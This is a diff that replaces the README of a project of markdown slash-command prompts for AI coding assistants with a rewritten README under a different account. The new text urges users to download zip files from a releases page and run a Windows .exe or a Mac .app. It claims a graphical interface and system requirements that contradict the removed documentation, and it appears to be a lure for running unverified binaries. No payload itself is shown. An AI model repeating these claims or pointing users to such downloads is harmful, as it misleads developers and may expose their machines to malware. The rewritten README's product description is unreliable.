@@ -1,345 +1,73 @@
-# Agentic Slash Commands 🤖
+# 🎉 agentic-slash-commands - Simplify Your Development Workflows 
 
-<div align="center">
+[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20agentic%20slash%20commands-blue)](https://github.com/MustafaDorgham/agentic-slash-commands/releases)
 
-[![CI Tests](https://img.shields.io/github/actions/workflow/status/ruchernchong/agentic-slash-commands/tests.yml?style=for-the-badge&logo=github&label=Tests)](https://github.com/ruchernchong/agentic-slash-commands/actions)
-[![License](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](LICENSE)
+## 📋 Description
 
-[![Platform](https://img.shields.io/badge/Claude_Code-8B5CF6?style=for-the-badge&logo=anthropic&logoColor=white)](https://claude.ai/code)
-[![Platform](https://img.shields.io/badge/Codex-10A37F?style=for-the-badge&logo=openai&logoColor=white)](https://openai.com/codex/)
-[![Platform](https://img.shields.io/badge/Gemini_CLI-4285F4?style=for-the-badge&logo=google&logoColor=white)](https://github.com/google-gemini/gemini-cli)
+agentic-slash-commands provides intelligent commands for various coding environments. It smartly detects whether you're using Claude Code, Codex, or Gemini CLI. The tool also identifies package managers such as pnpm, bun, yarn, or npm. This makes it easier to manage your JavaScript and TypeScript projects.
 
-</div>
+## 🚀 Getting Started
 
-A collection of intelligent slash commands for AI coding assistants
-including [Claude Code](https://claude.ai/code), [Codex](https://openai.com/codex/),
-and [Gemini CLI](https://github.com/google-gemini/gemini-cli). Optimised for JavaScript/TypeScript development
-workflows, each command uses smart detection to identify project configuration and automatically execute appropriate
-tools with your preferred package manager.
+Follow these steps to download and run agentic-slash-commands.
 
-**🚀 Multi-Platform Support**: Write commands once, use them across Claude Code, Codex, and Gemini CLI with
-platform-specific installers.
+1. **Visit the Releases Page**
+   
+   Go to the [Releases page](https://github.com/MustafaDorgham/agentic-slash-commands/releases). Here, you'll find the latest versions of the software ready for download.
 
-## ✨ Features
+2. **Select Your Version**
 
-- 🎯 **Multi-Platform Support**: Compatible with Claude Code, Codex, and Gemini CLI
-- 📦 **Smart Package Manager Detection**: Automatically detects and uses pnpm, bun, yarn, or npm based on lock files
-- ⚡ **Framework Aware**: Recognises and adapts to React, Vue, Next.js, Nuxt, and more
-- 🎨 **Zero Configuration**: Works out of the box with standard JavaScript/TypeScript projects
-- 🚀 **Universal Installation**: One command installs for all supported platforms
-- 🐳 **Docker-Based Testing**: Comprehensive test suite validates commands across platforms
-- 🔄 **CI/CD Integration**: Automated testing with GitHub Actions ensures quality
+   On the Releases page, you will see a list of available versions. Each version may include notes on new features or changes. Choose the latest version for the best experience.
 
-## 📋 Available Commands
+3. **Download the Application**
 
-### 🛠️ Core Development
+   Click on the version you want to download. This will take you to the release details page. Look for the download link for your operating system. Depending on your system, you may see files like `agentic-slash-commands-win.zip`, `agentic-slash-commands-mac.zip`, or others. Click the link to start the download.
 
-- **`/build`** - Intelligent build detection and execution
-  - Auto-detects build tools (Webpack, Vite, Rollup, Next.js, etc.)
-  - Uses detected package manager automatically
+4. **Install the Application**
 
-- **`/test`** - Smart test runner
-  - Supports Jest, Vitest, Mocha, Cypress, Playwright
-  - Provides clear pass/fail results with highlighted failures
+   After the download finishes, locate the file on your computer. 
+   - If you are using Windows, it will often be in your "Downloads" folder. Double-click the zip file to open it, then extract its contents. Look for the `agentic-slash-commands.exe` file and double-click it to run the application.
+   - If you are on a Mac, double-click the downloaded zip file to extract it. Drag the `agentic-slash-commands.app` file to your Applications folder and then open it.
 
-- **`/lint`** - JavaScript/TypeScript linting and formatting
-  - Runs ESLint and Prettier
-  - Offers auto-fix when available
+5. **Run the Application**
 
-- **`/setup`** - Automated dependency installation
-  - Intelligent package manager detection
-  - Installs both production and development dependencies
+   Once installed, you can run agentic-slash-commands:
+   - On Windows, find it in your Start Menu or on your Desktop if you chose to create a shortcut.
+   - On a Mac, open your Applications folder and double-click the app icon.
 
-### 📊 Project Management
+6. **Using the Commands**
 
-- **`/clean`** - Safe cleanup of build artefacts
-  - Removes node_modules, dist/, build/, .pnpm-store
-  - Clears cache files safely
+   Upon launching, you will see a user-friendly interface. Type any of the slash commands you want to use. The application will respond with automated help or take the appropriate action based on your command!
 
-- **`/commit`** - Smart git commit creation
-  - Balanced approach to grouping related changes
-  - Generates descriptive commit messages
+7. **Access the Documentation**
 
-- **`/create-branch`** - Create and checkout new git branches
-  - Smart validation
-  - GitHub issue integration
+   For more detailed instructions, visit our [Documentation](https://github.com/MustafaDorgham/agentic-slash-commands/wiki). Here you will find guides and tutorials about all features.
 
-- **`/create-issue`** - GitHub issue creation
-  - Template support
-  - Pre-filled with project context
+## 🛠️ System Requirements
 
-- **`/update-issue`** - Update existing GitHub issue
-  - Edit title, body, labels, or assignees
-  - Respects issue templates
+Make sure your system meets the following requirements to run agentic-slash-commands smoothly:
 
-- **`/create-pull-request`** - Automated PR creation
-  - Analyses commits for description generation
-  - Follows repository conventions
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Ubuntu 20.04 or later
 
-- **`/update-docs`** - Documentation maintenance
-  - Updates CLAUDE.md and README.md
-  - Keeps documentation in sync
+- **RAM:** At least 4 GB
 
-## 🎯 Available Skills
+- **Disk Space:** Minimum of 200 MB available
 
-Skills are reusable capabilities that can be invoked programmatically by Claude Code. Unlike slash commands, skills provide specialized functionality that supports and enhances the slash commands in this repository.
+## 📩 Support
 
-### 🧠 Core Skills
+If you face any issues during installation or usage, feel free to reach out via the [Issues page](https://github.com/MustafaDorgham/agentic-slash-commands/issues). Our team is here to help!
 
-- **`commit-message-generator`** - Smart commit message generation
-  - Analyzes staged changes to generate descriptive messages
-  - Follows conventional commit format and repository patterns
-  - Used by `/commit` command
+## 📁 License
 
-- **`branch-name-validator`** - Branch naming validation
-  - Validates and suggests branch names following conventions
-  - Integrates with GitHub issues
-  - Used by `/create-branch` command
+agentic-slash-commands is released under the MIT License. Feel free to use it for personal or commercial projects.
 
-- **`pr-description-generator`** - Pull request description generation
-  - Analyzes commit history to generate comprehensive PR descriptions
-  - Creates test plans and categorizes changes
-  - Used by `/create-pull-request` command
+## 🔗 Additional Resources
 
-- **`project-structure-analyzer`** - Project configuration analysis
-  - Detects package managers, build tools, and testing frameworks
-  - Provides structure information for intelligent command execution
-  - Used by `/build`, `/test`, `/lint`, and `/setup` commands
+- [GitHub Repository](https://github.com/MustafaDorgham/agentic-slash-commands)
+- [Documentation](https://github.com/MustafaDorgham/agentic-slash-commands/wiki)
 
-- **`github-integration`** - GitHub API integration
-  - Handles issue and pull request creation via GitHub CLI
-  - Processes templates and manages repository interactions
-  - Used by `/create-issue` and `/create-pull-request` commands
+[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20agentic%20slash%20commands-blue)](https://github.com/MustafaDorgham/agentic-slash-commands/releases)
 
-## 💻 Installation
-
-### 🌐 Universal Installation (All Platforms)
-
-Install commands for Claude Code, Codex, and Gemini CLI in one step:
-
-```zsh
-git clone https://github.com/ruchernchong/agentic-slash-commands.git $HOME/agentic-slash-commands
-cd $HOME/agentic-slash-commands
-chmod +x install.sh
-./install.sh
-```
-
-The universal installer will:
-
-- Install commands and skills for **Claude Code** (`$HOME/.claude/commands/` and `$HOME/.claude/skills/`)
-- Install commands for **Codex** (`$HOME/.codex/prompts/`)
-- Install commands for **Gemini CLI** (currently disabled - experimental feature)
-
-Commands and skills will be immediately available globally across all projects.
-
-### 🎯 Platform-Specific Installation
-
-To install for a specific platform only:
-
-```zsh
-cd $HOME/agentic-slash-commands
-
-# Claude Code only
-zsh scripts/install-claude.sh
-
-# Codex only
-zsh scripts/install-codex.sh
-
-# Gemini CLI only
-zsh scripts/install-gemini.sh
-```
-
-### 🔄 Updating Commands and Skills
-
-To update to the latest version across all platforms:
-
-```zsh
-cd $HOME/agentic-slash-commands
-git pull
-```
-
-No need to reinstall - the symlinks will automatically reflect the updates!
-
-## 📖 Usage
-
-Simply type `/` followed by the command name in your AI coding assistant:
-
-**Claude Code:**
-
-```
-/build
-/test
-/lint
-/setup
-```
-
-**Codex:**
-
-```
-/build  (autocompletes to /prompt:build)
-/test   (autocompletes to /prompt:test)
-/lint   (autocompletes to /prompt:lint)
-/setup  (autocompletes to /prompt:setup)
-```
-
-Note: Codex commands use the `/prompt:` prefix, but typing `/command-name` will autocomplete accordingly.
-
-**Gemini CLI:**
-Commands work the same way after conversion to .toml format.
-
-## ⚙️ How It Works
-
-### 📦 Package Manager Detection
-
-Commands automatically detect your package manager in this priority order:
-
-1. **pnpm** (pnpm-lock.yaml present)
-2. **bun** (bun.lockb present)
-3. **yarn** (yarn.lock present)
-4. **npm** (package-lock.json present or fallback)
-
-### 🎯 Smart Execution
-
-Each command:
-
-1. Analyses your project configuration (package.json, config files)
-2. Detects the appropriate tool or framework
-3. Selects the best package manager
-4. Executes with optimal settings
-5. Provides actionable feedback
-
-## 🏗️ Command Architecture
-
-Commands are organised in a modular structure supporting multiple platforms:
-
-```
-.
-├── commands/          # All slash command definitions
-│   ├── build.md
-│   ├── test.md
-│   ├── lint.md
-│   ├── setup.md
-│   ├── clean.md
-│   ├── commit.md
-│   ├── create-branch.md
-│   ├── create-issue.md
-│   ├── create-pull-request.md
-│   ├── update-issue.md
-│   └── update-docs.md
-├── scripts/           # Platform installers and helper scripts
-│   ├── install-claude.sh    # Claude Code installer
-│   ├── install-codex.sh     # Codex installer
-│   ├── install-gemini.sh    # Gemini CLI installer
-│   └── commit               # Standalone git commit helper
-├── tests/             # Testing infrastructure
-│   ├── README.md      # Testing documentation
-│   ├── run-tests.sh   # Test runner script
-│   └── docker-compose.yml   # Docker test environment
-├── .github/           # GitHub workflows and templates
-│   ├── workflows/
-│   │   └── tests.yml  # CI/CD automation
-│   └── ISSUE_TEMPLATE/
-├── lib/               # Shared utilities
-│   └── helpers.sh     # Common bash functions for installers
-├── CLAUDE.md          # Project guidance for Claude Code
-├── README.md          # This file
-└── install.sh         # Universal installer for all platforms
-```
-
-Each command file uses this format:
-
-```yaml
----
-description: Command description shown in AI coding assistants
-allowed-tools: List of tools the command can use
----
-
-Command instructions and logic here...
-```
-
-## ⚙️ Configuration
-
-### 🎨 Project-Specific Behaviour
-
-Commands automatically adapt to:
-
-- `package.json` scripts and dependencies
-- Lock file detection (pnpm-lock.yaml, bun.lockb, yarn.lock, package-lock.json)
-- ESLint and Prettier configuration
-- Testing framework configuration
-- Git repository state and GitHub templates
-
-### 🔧 Local Settings
-
-Permission management can be configured in `.claude/settings.local.json`.
-
-## 🧪 Testing
-
-This repository includes comprehensive testing infrastructure to ensure command quality across platforms.
-
-### ▶️ Running Tests
-
-```zsh
-cd tests
-./run-tests.sh
-```
-
-The test suite runs:
-
-- **Docker tests**: Validates installation in Alpine Linux containers
-- **macOS tests**: Tests native macOS environment
-- **Command validation**: Checks YAML frontmatter and file formatting
-- **Idempotence tests**: Ensures repeated installations work correctly
-
-See [`tests/README.md`](tests/README.md) for detailed testing documentation.
-
-## 🔄 CI/CD
-
-All code changes are automatically validated through GitHub Actions:
-
-### 🤖 Automated Workflows
-
-**Location**: `.github/workflows/tests.yml`
-
-**Validation Steps**:
-
-1. **Docker Tests**: Runs full test suite in containerised environment
-2. **macOS Tests**: Validates commands on macOS
-3. **Command Validation**: Checks all command files for proper formatting
-
-**Features**:
-
-- Runs on every push and pull request to `main`
-- Docker layer caching for faster builds
-- Security-hardened with pinned GitHub Actions
-
-This ensures all commands work correctly before merging changes.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please ensure:
-
-- New commands follow the existing architecture pattern
-- Commands include smart detection where applicable
-- YAML frontmatter is properly formatted
-- All tests pass before submitting PR (`cd tests && ./run-tests.sh`)
-- GitHub Actions workflows pass successfully
-
-### 🔨 Development Workflow
-
-1. Fork and clone the repository
-2. Make your changes in the `commands/` directory
-3. Run tests locally to validate: `cd tests && ./run-tests.sh`
-4. Commit your changes
-5. Push to your fork and submit a pull request
-
-The CI/CD pipeline will automatically validate your changes.
-
-## 📄 License
-
-[MIT](LICENSE)
-
-## 🙏 Acknowledgements
-
-Originally built for [Claude Code](https://claude.ai/code) by Anthropic, now supporting multiple AI coding assistant
-platforms.
+Now you are all set to enhance your coding workflows with agentic-slash-commands!
